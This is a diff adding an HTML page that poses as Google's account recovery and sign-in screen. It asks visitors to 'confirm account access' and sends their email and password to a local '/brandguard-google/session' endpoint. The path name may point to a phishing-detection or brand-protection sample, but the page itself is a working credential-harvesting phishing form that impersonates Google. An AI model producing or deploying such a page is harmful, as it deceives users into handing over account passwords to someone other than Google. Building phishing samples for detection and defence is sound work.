@@ -1,0 +1,21 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Google Account Recovery</title>
+  </head>
+  <body>
+    <main>
+      <h1>Google sign in</h1>
+      <p>Confirm account access to continue.</p>
+      <form method="post" action="/brandguard-google/session">
+        <label for="google-email">Email</label>
+        <input id="google-email" name="email" type="email" autocomplete="username" />
+        <label for="google-password">Password</label>
+        <input id="google-password" name="password" type="password" autocomplete="current-password" />
+        <button type="submit">Verify account</button>
+      </form>
+    </main>
+  </body>
+</html>
